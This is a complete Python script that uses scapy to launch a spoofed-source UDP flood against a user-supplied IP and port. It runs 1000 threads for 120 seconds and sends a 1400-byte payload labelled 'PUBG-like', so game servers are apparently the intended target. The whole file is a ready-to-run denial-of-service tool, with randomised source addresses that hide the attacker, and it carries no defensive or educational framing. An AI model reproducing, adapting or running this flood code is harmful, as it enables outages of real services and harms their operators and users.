import threading
import time
import random
from scapy.all import IP, UDP, Raw, send
import os

# Default config
TARGET_IP = None            # Set via input
TARGET_PORT = None          # Set via input
DURATION = 120              # 120 seconds
THREADS = 1000              # Maxed out—tweak if Codespace chokes
CUSTOM_PAYLOAD = b"\x72\xfe\x1d\x13\x00\x00" + (b"\xFF" * 1394)  # 1400 bytes, PUBG-like

# Flood function with spoofed source IP
def flood(target_ip, target_port):
    try:
        end_time = time.time() + DURATION
        while time.time() < end_time:
            # Spoof random source IP
            src_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
            packet = IP(src=src_ip, dst=target_ip) / UDP(sport=random.randint(1024, 65535), dport=target_port) / Raw(load=CUSTOM_PAYLOAD)
            send(packet, verbose=0)  # Send without output
    except Exception as e:
        print(f"Thread error: {e}")

# Main execution
if __name__ == "__main__":
    # Check if running as root (needed for raw sockets)
    if os.geteuid() != 0:
        print("Error: Must run as root (sudo) for raw socket spoofing!")
        exit(1)

    # Get user input
    TARGET_IP = input("Enter target IP (e.g., 8.8.8.8): ")
    try:
        TARGET_PORT = int(input("Enter target port (e.g., 53): "))
    except ValueError:
        print("Error: Port must be a number!")
        exit(1)

    print(f"Starting advanced UDP flood on {TARGET_IP}:{TARGET_PORT}")
    print(f"Threads: {THREADS}, Duration: {DURATION}s, Payload: {len(CUSTOM_PAYLOAD)} bytes, Spoofed IPs: Enabled")

    # Launch threads
    threads_list = []
    start_time = time.time()
    for _ in range(THREADS):
        t = threading.Thread(target=flood, args=(TARGET_IP, TARGET_PORT))
        t.start()
        threads_list.append(t)

    # Wait for threads to finish
    for t in threads_list:
        t.join()

    elapsed = time.time() - start_time
    print(f"Flood complete in {elapsed:.2f} seconds!")
